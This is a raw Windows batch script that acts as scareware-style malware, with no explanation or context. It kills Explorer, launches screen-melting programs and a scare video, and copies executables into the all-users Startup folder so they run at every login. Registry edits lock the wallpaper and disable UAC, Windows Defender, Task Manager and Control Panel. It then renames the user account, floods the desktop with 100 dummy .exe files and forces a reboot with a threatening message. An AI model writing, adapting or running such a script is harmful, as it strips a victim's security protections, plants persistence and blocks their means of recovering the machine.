@echo off
taskkill /f /im explorer.exe
start CreepScreen.exe
timeout 5 /nobreak
start melter.exe
timeout 10 /nobreak
taskkill /f /im CreepScreen.exe
taskkill /f /im melter.exe
start scarr.mp4
copy /y bg.bmp c:\
copy /y mover.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
copy /y melter.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\bg.bmp /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
reg.exe ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop /v NoChangingWallPaper /t REG_DWORD /d 1 /f
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d "1" /f
net user %username% /fullname:"IT'S TOO LATE!!!"
timeout 8 /nobreak
SET /a cr=0

:0
type nul > C:\users\public\desktop\%random%.exe
SET /a cr=%cr%+1
if not %cr%==100 goto 0

shutdown /r /t 5 /c "I CATCH YOU AND EAT YOUR FACE!!!"